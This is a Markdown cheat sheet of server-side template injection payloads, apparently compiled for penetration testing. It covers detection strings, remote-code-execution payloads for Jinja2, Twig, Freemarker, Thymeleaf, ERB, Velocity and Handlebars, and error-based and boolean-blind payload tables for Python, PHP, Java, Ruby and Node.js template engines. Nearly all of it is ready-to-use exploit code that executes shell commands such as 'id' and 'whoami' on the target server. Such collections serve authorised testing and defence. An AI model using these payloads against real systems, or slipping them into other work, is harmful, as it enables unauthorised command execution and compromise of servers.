# Detect
## Special characters
```
{
}
$
#
@
%)
"
'
|
{{
}}
${
<%
<%=
%>
```

## [Template Expressions - Seclist ](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-expression.txt) :
```
42*42  
{42*42}  
{{42*42}}  
{{{42*42}}}  
#{42*42}  
${42*42}  
<%=42*42 %>  
{{=42*42}}  
{^xyzm42}1764{/xyzm42}  
${donotexists|42*42}  
[[${42*42}]]
```

# Escalate
## [Template Special Vars](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/template-engines-special-vars.txt)

# RCE examples

**Jinja2 (Python - Flask, Ansible):**

```python
# Detection
{{7*7}}                              # Returns 49
{{7*'7'}}                            # Returns 7777777

# Reconnaissance
{{config}}
{{config.items()}}
{{self}}
{%debug%}

# RCE via __subclasses__
{{''.__class__.__mro__[1].__subclasses__()}}

# Find useful classes
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}

# subprocess.Popen
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}

# Modern bypass (Python 3)
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

# Lipsum object abuse
{{lipsum.__globals__['os'].popen('whoami').read()}}

# Cycler object
{{cycler.__init__.__globals__.os.popen('whoami').read()}}
```

**Twig (PHP - Symfony):**

```twig
# Detection
{{7*7}}

# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}

# Alternative
{{_self.env.enableDebug()}}
{{_self.env.isDebug()}}

# PHP filter chain (modern)
{{["id"]|filter("system")}}
```

**Freemarker (Java):**

```java
# Detection
${7*7}

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}

# Alternative
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign method=clazz.getMethod("getRuntime",null)>
<#assign runtime=method.invoke(null,null)>
<#assign method=clazz.getMethod("exec",classLoader.loadClass("java.lang.String"))>
${method.invoke(runtime,"whoami")}
```

**Thymeleaf (Java - Spring):**

```java
# Detection
[[${7*7}]]

# RCE
${T(java.lang.Runtime).getRuntime().exec('whoami')}
[[${T(java.lang.Runtime).getRuntime().exec('whoami')}]]

# Spring EL alternative
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}
```

**ERB (Ruby - Rails):**

```ruby
# Detection
<%= 7*7 %>

# RCE
<%= system("whoami") %>
<%= `whoami` %>
<%= IO.popen('whoami').readlines() %>
<%= %x(whoami) %>
```

**Velocity (Java):**

```java
# Detection
#set($x = 7 * 7)$x

# RCE
#set($rt = $class.forName("java.lang.Runtime"))
#set($chr = $class.forName("java.lang.Character"))
#set($str = $class.forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$chr.toString($out.read())
#end
```

**Handlebars (JavaScript/Node.js):**

```javascript
# Detection
{{7*7}}

# RCE (if helper is vulnerable)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
# Blind Erorr-Based 

[from this source ](https://github.com/vladko312/Research_Successful_Errors/edit/main/Payloads.md)
- [Error-Based](#error-based)
  - [Generic Detection](#generic-detection)
  - [Python](#python)
  - [PHP](#php)
  - [Java](#java)
  - [Ruby](#ruby)
  - [NodeJS](#nodejs)
- [Boolean Error-Based Blind](#boolean-error-based-blind-boolean-based)
  - [Generic Detection](#generic-detection-1)
  - [Python](#python-1)
  - [PHP](#php-1)
  - [Java](#java-1)
  - [Ruby](#ruby-1)
  - [NodeJS](#nodejs-1)

---

## Error-Based
### Generic detection
```
(1/0).zxy.zxy
```

---

### Python
| type    | payload                                                   |
|---------|-----------------------------------------------------------|
| General | `getattr("", "x" + OUTPUT)`                               |
| Eval    | `getattr("", "x" + eval("7*7"))`                          |
| RCE     | `getattr("", "x" + __include__("os").popen("id").read())` |

| template       | tag       |
|----------------|-----------|
| Tornado        | {{ ... }} |
| Mako           | ${ ... }  |
| SimpleTemplate | {{ ... }} |
| Cheetah3       | ${ ... }  |
| Chameleon      | ${ ... }  |

#### Jinja2
| type    | payload                                                                                                                  |
|---------|--------------------------------------------------------------------------------------------------------------------------|
| General | `{{ cycler.__init__.__globals__.__builtins__.getattr("", "x" + OUTPUT) }}`                                               |
| Eval    | `{{ cycler.__init__.__globals__.__builtins__.getattr("", "x" + cycler.__init__.__globals__.__builtins__.eval("7*7")) }}` |
| RCE     | `{{ cycler.__init__.__globals__.__builtins__.getattr("", "x" + cycler.__init__.__globals__.os.popen('id').read()) }}`    |

---

### PHP
> [!TIP]
> Use `ini_set("error_reporting", "1");` to enable verbose error output

| type      | payload                                                                                |
|-----------|----------------------------------------------------------------------------------------|
| General 1 | `fopen(join("", ["Y:/A:/", OUTPUT]), "r")`                                             |
| Eval 1-1  | `fopen(join("", ["Y:/A:/", shell_exec('php -r "echo eval(\'return 7*7;\');"')]), "r")` |
| Eval 1-2  | `fopen(join("", ["Y:/A:/", eval('return 7*7;')]), "r")`                                |
| RCE 1     | `fopen(join("", ["Y:/A:/", shell_exec('id')]), "r")`                                   |
| General 2 | `include(join("", ["Y:/A:/", OUTPUT]))`                                                |
| Eval 2-1  | `include(join("", ["Y:/A:/", shell_exec('php -r "echo eval(\'return 7*7;\');"')]))`    |
| Eval 2-2  | `include(join("", ["Y:/A:/", eval('return 7*7;')]))`                                   |
| RCE 2     | `include(join("", ["Y:/A:/", shell_exec('id')]))`                                      |
| General 3 | `join("", ["xx", OUTPUT])()`                                                           |
| Eval 3-1  | `join("", ["xx", shell_exec('php -r "echo eval(\'return 7*7;\');"')])()`               |
| Eval 3-2  | `join("", ["xx", eval('return 7*7;')])()`                                              |
| RCE 3     | `join("", ["xx", shell_exec('id')])()`                                                 |

> [!IMPORTANT]
> Templates can use `General 1`, `Eval 1-1` and `RCE 1` payloads

| template  | tag       |
|-----------|-----------|
| Blade     | {{ ... }} |
| Smarty    | { ... }   |
| Latte     | {= ... }  |

#### Twig
> [!TIP]
> Use `{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %}` to enable verbose error output

| version                | type    | payload                                                                                                                                                |
|------------------------|---------|--------------------------------------------------------------------------------------------------------------------------------------------------------|
| any                    | General | `{%include ["Y:/A:/", OUTPUT]\|join%}`                                                                                                                 |
| <= 1.19                | Eval    | `{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{%include ["Y:/A:/", _self.env.getFilter("php -r 'echo eval(\"return 7*7;\");'")]\|join%}` |
| <= 1.19                | RCE     | `{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{%include ["Y:/A:/", _self.env.getFilter("id")]\|join%}`                                   |
| \>=1.41, >=2.10, >=3.0 | General | `{{[0]\|map(["xx", OUTPUT]\|join)}}`                                                                                                                   |
| \>=1.41, >=2.10, >=3.0 | Eval    | `{{[0]\|map(["xx", {"php -r 'echo eval(\"return 7*7;\");'": "shell_exec"}\|map("call_user_func")\|join]\|join)}}`                                      |
| \>=1.41, >=2.10, >=3.0 | RCE     | `{{[0]\|map(["xx", {"id": "shell_exec"}\|map("call_user_func")\|join]\|join)}}`                                                                        |

---

### Java
#### SpEL
| type    | payload                                                                                                                                                                                                                                                    |
|---------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| General | `"".getClass().forName('java.lang.Integer').valueOf("x"+OUTPUT)`                                                                                                                                                                                           |
| RCE     | `"".getClass().forName('java.lang.Integer').valueOf("x"+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))` |

#### Freemarker
| type    | payload                                                               |
|---------|-----------------------------------------------------------------------|
| General | `${("xx"+OUTPUT)?new()}`                                              |
| RCE     | `${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()}` |

#### Velocity
| type    | payload                                                                                                                                                                                                                                                                   |
|---------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| General | `#include("Y:/A:/"+OUTPUT)`                                                                                                                                                                                                                                               |
| RCE     | `#set($s="")#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))#set($n=$p.waitFor())#include("Y:/A:/"+$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))` |

---

### Ruby
| type    | payload                                |
|---------|----------------------------------------|
| General | `File.read("Y:/A:/"+OUTPUT)`           |
| Eval    | `File.read("Y:/A:/"+eval("7*7").to_s)` |
| RCE     | `File.read("Y:/A:/"+%x('id'))`         |

| template | tag        |
|----------|------------|
| ERB      | <%= ... %> |
| Erubi    | <%= ... %> |
| Erubis   | <%= ... %> |
| Haml     | #{ ... }   |
| Slim     | #{ ... }   |

---

### NodeJS 
| type      | payload                                                                                                                    |
|-----------|----------------------------------------------------------------------------------------------------------------------------|
| General 1 | `global.process.mainModule.require("Y:/A:/"+OUTPUT)`                                                                       |
| Eval 1    | `global.process.mainModule.require("Y:/A:/"+eval("7*7").toString())`                                                       |
| RCE 1     | `global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id").toString())` |
| General 2 | `""["x"][OUTPUT]`                                                                                                          |
| Eval 2    | `""["x"][eval("7*7").toString()]`                                                                                          |
| RCE 2     | `""["x"][global.process.mainModule.require("child_process").execSync("id").toString()]`                                    |

> [!IMPORTANT]
> `General 1`, `Eval 1` and `RCE 1` payloads might not work for some cases

| template   | tag                              |
|------------|----------------------------------|
| EJS        | <%= ... %>                       |
| Underscore | <%= ... %>                       |
| Pug        | #{ ... }                         |
| DotJS      | {{= ... }}                       |
| Eta        | <%= ... %>                       |
| Nunjucks   | {{range.constructor(' ... ')()}} |

> [!NOTE]
> Nunjucks uses `range.constructor(' ... ')()` to evaluate JS code, check quotes in payload

---

## Boolean Error-Based Blind (Boolean-Based)
### Generic detection
| test | ok              | error           |
|------|-----------------|-----------------|
| 1    | `(3*4/2)`       | `3*)2(/4`       |
| 2    | `((7*8)/(2*4))` | `7)(*)8)(2/(*4` |

---

### Python
| test | ok                              | error                           |
|------|---------------------------------|---------------------------------|
| 1    | `1 / ('a'.join('bc') == 'bac')` | `1 / ('a'.join('bc') == 'abc')` |
| 2    | `1 / (bool('False') == True)`   | `1 / (bool('True') == False)`   |

| type    | payload                                                 |
|---------|---------------------------------------------------------|
| Eval    | `1 / bool(eval("7*7"))`                                 |
| RCE     | `1 / (__include__("os").popen("id")._proc.wait() == 0)` |

| template       | tag       |
|----------------|-----------|
| Tornado        | {{ ... }} |
| Mako           | ${ ... }  |
| SimpleTemplate | {{ ... }} |
| Cheetah3       | ${ ... }  |
| Chameleon      | ${ ... }  |

#### Jinja2
| test | ok                                                                                             | error                                                                                          |
|------|------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------|
| 1    | `{{ 1 / (not not cycler.__init__.__globals__.__builtins__.eval("'a'.join('bc') == 'bac'")) }}` | `{{ 1 / (not not cycler.__init__.__globals__.__builtins__.eval("'a'.join('bc') == 'abc'")) }}` |
| 2    | `{{ 1 / (not not cycler.__init__.__globals__.__builtins__.eval("bool('False') == True")) }}`   | `{{ 1 / (not not cycler.__init__.__globals__.__builtins__.eval("bool('True') == False")) }}`   |

| type    | payload                                                                    |
|---------|----------------------------------------------------------------------------|
| Eval    | `{{ 1 / (not not cycler.__init__.__globals__.__builtins__.eval("7*7")) }}` |
| RCE     | `{{ 1 / (cycler.__init__.__globals__.os.popen("id")._proc.wait() == 0) }}` |

---

### PHP
> [!TIP]
> Use `ini_set("error_reporting", "1");` to enable verbose error output

| test | ok                       | error                    |
|------|--------------------------|--------------------------|
| 1    | `1 / ('2' + '3' == 5)`   | `1 / ('2' + '5' == 3)`   |
| 2    | `1 / (strlen('2') == 1)` | `1 / (strlen('1') == 2)` |

| type   | payload                                                                             |
|--------|-------------------------------------------------------------------------------------|
| Eval 1 | `1 / (pclose(popen("php -r '1 / (true && eval(\"return 7 * 7;\"));'", "wb")) == 0)` |
| Eval 2 | `1 / (true && eval("return 7 * 7;"))`                                               |
| RCE    | `1 / (pclose(popen("id", "wb")) == 0)`                                              |

> [!IMPORTANT]
> Templates can use `Eval 1` and `RCE` payloads

| template  | tag       |
|-----------|-----------|
| Blade     | {{ ... }} |
| Smarty    | { ... }   |
| Latte     | {= ... }  |

#### Twig
> [!TIP]
> Use `{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %}` to enable verbose error output

| version                | test | ok                                                                                                                                                                             | error                                                                                                                                                                          |
|------------------------|------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| <= 1.19                | 1    | `{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("php -r '1 / (\"2\" + \"3\" == 5);' && echo SSTIMAP")\|trim('\n') ends with "SSTIMAP")}}` | `{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("php -r '1 / (\"2\" + \"5\" == 3);' && echo SSTIMAP")\|trim('\n') ends with "SSTIMAP")}}` |
| <= 1.19                | 2    | `{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("php -r '1 / (strlen(\"2\") == 1);' && echo SSTIMAP")\|trim('\n') ends with "SSTIMAP")}}` | `{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("php -r '1 / (strlen(\"1\") == 2);' && echo SSTIMAP")\|trim('\n') ends with "SSTIMAP")}}` |
| \>=1.41, >=2.10, >=3.0 | 1    | `{{1/({"php -r '1 / (\"2\" + \"3\" == 5);' && echo SSTIMAP":"shell_exec"}\|map("call_user_func")\|join\|trim('\n') ends with "SSTIMAP")}}`                                     | `{{1/({"php -r '1 / (\"2\" + \"5\" == 3);' && echo SSTIMAP":"shell_exec"}\|map("call_user_func")\|join\|trim('\n') ends with "SSTIMAP")}}`                                     |
| \>=1.41, >=2.10, >=3.0 | 2    | `{{1/({"php -r '1 / (1 / (strlen(\"2\") == 1));' && echo SSTIMAP":"shell_exec"}\|map("call_user_func")\|join\|trim('\n') ends with "SSTIMAP")}}`                               | `{{1/({"php -r '1 / (strlen(\"1\") == 2);' && echo SSTIMAP":"shell_exec"}\|map("call_user_func")\|join\|trim('\n') ends with "SSTIMAP")}}`                                     |

| version                | type | payload                                                                                                                                                                                   |
|------------------------|------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| <= 1.19                | Eval | `{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("php -r '1 / (true && eval(\"return 7*7;\"));' && echo SSTIMAP")\|trim('\n') ends with "SSTIMAP")}}` |
| <= 1.19                | RCE  | `{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("id && echo SSTIMAP")\|trim('\n') ends with "SSTIMAP")}}`                                            |
| \>=1.41, >=2.10, >=3.0 | Eval | `{{1/({"php -r '1 / (true && eval(\"return 7*7;\"));' && echo SSTIMAP":"shell_exec"}\|map("call_user_func")\|join\|trim('\n') ends with "SSTIMAP")}}`                                     |
| \>=1.41, >=2.10, >=3.0 | RCE  | `{{1/({"id && echo SSTIMAP":"shell_exec"}\|map("call_user_func")\|join\|trim('\n') ends with "SSTIMAP")}}`                                                                                |

---

### Java
#### SpEL
| test | ok                                                                                                     | error                                                                                                  |
|------|--------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------|
| 1    | `"".getClass().forName('java.lang.Integer').valueOf('1')/((1000000000+1000000000==2000000000)?1:0)+""` | `"".getClass().forName('java.lang.Integer').valueOf('1')/((1000000000+2000000000==1000000000)?1:0)+""` |
| 2    | `"".getClass().forName('java.lang.Integer').valueOf('1')/((2000000000+2000000000==-294967296)?1:0)+""` | `"".getClass().forName('java.lang.Integer').valueOf('1')/((2000000000+2000000000==-224667999)?1:0)+""` |

RCE:
```java
1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+""
```

#### Freemarker
| test | ok                                         | error                                      |
|------|--------------------------------------------|--------------------------------------------|
| 1    | `${1/((1.0 == 1.0)?string('1','0')?eval)}` | `${1/((1.0 == 0.1)?string('1','0')?eval)}` |
| 2    | `${1/((2 > 1)?string('1','0')?eval)}`      | `${1/((1 > 2)?string('1','0')?eval)}`      |

RCE:
```java
${1/((freemarker.template.utility.Execute"?new()(" … && echo SSTIMAP")?chop_linebreak?ends_with("SSTIMAP"))?string('1','0')?eval)}
```

#### Velocity
| test | ok                                                         | error                                                      |
|------|------------------------------------------------------------|------------------------------------------------------------|
| 1    | `#if(false)#include("Y:/A:/true")#end`                     | `#if(true)#include("Y:/A:/false")#end`                     |
| 2    | `#set($o=1.0)#if($o.equals(0.1))#include("Y:/A:/xxx")#end` | `#set($o=1.0)#if($o.equals(1.0))#include("Y:/A:/xxx")#end` |

RCE:
```java
#set($s="")#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))#set($n=$p.waitFor())#set($r=$p.exitValue())#if($r != 0)#include("Y:/A:/xxx")#end
```

---

### Ruby
| test | ok                                  | error                               |
|------|-------------------------------------|-------------------------------------|
| 1    | `1/(((2 + 3).to_s == '5')&&1\|\|0)` | `1/(((2 + 5).to_s == '3')&&1\|\|0)` |
| 2    | `1/(('2'.length == 1)&&1\|\|0)`     | `1/(('1'.length == 2)&&1\|\|0)`     |

> [!IMPORTANT]
> In Ruby, only `false` and `nil` are considered false values

| type    | payload                     |
|---------|-----------------------------|
| Eval    | `1/(!!eval("7*7")&&1\|\|0)` |
| RCE     | `1/(system("id")&&1\|\|0)`  |

| template | tag        |
|----------|------------|
| ERB      | <%= ... %> |
| Erubi    | <%= ... %> |
| Erubis   | <%= ... %> |
| Haml     | #{ ... }   |
| Slim     | #{ ... }   |

---

### NodeJS
| test | ok                                                  | error                                               |
|------|-----------------------------------------------------|-----------------------------------------------------|
| 1    | `[""][0 + !(typeof(1) + 2 == "number2")]["length"]` | `[""][0 + !(typeof(2) + 1 == "number2")]["length"]` |
| 2    | `[""][0 + !(parseInt("5x") == 5)]["length"]`        | `[""][0 + !(parseInt("x5") == 5)]["length"]`        |

| type    | payload                                                                                                                      |
|---------|------------------------------------------------------------------------------------------------------------------------------|
| Eval    | `[""][0 + !eval("7*7")]["length"]`                                                                                           |
| RCE     | `[""][0 + !(global.process.mainModule.require("child_process").spawnSync("id", options={shell:true}).status===0)]["length"]` |

| template   | tag                              |
|------------|----------------------------------|
| EJS        | <%= ... %>                       |
| Underscore | <%= ... %>                       |
| Pug        | #{ ... }                         |
| DotJS      | {{= ... }}                       |
| Eta        | <%= ... %>                       |
| Nunjucks   | {{range.constructor(' ... ')()}} |

> [!NOTE]
> Nunjucks uses `range.constructor(' ... ')()` to evaluate JS code, check quotes in payload